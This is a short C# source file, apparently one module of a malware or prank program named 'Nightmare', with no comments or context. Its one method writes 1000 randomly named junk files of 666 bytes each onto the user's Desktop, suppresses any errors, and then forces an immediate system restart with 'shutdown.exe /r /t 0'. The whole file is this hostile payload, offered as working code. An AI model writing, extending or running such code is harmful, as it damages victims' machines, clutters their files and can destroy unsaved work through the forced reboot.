using System.Threading;
using System;
using System.IO;

namespace Nightmare
{
    public class RandFiles
    {
        public static void rnd_files()
        {
            string desktop_path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\";
            for (int num = 0; num < 1000; num++)
            {
                string rnd_name = GeneratorChar.gen(100);
                try
                {
                    File.WriteAllBytes(desktop_path + rnd_name, new byte[666]);
                }
                catch { }
                Thread.Sleep(5);
            }
            Thread.Sleep(1000);
            Cmd.CmdResource("shutdown.exe", "/r /t 0");
        }
    }
}